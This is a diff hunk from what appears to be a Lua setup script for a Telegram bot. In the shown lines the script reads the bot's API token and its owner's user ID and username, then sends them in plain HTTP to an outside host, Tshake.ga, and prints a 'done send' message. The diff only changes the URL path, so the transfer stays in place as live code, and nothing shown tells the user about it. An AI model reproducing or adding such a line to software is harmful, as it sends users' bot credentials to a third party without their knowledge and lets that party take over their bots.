@@ -69,7 +69,7 @@ end
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
-res = https.request('http://Tshake.ga/boyka.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
+res = https.request('http://Tshake.ga/boyka/boyka.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("BOYKA", "w")  
 file:write([[
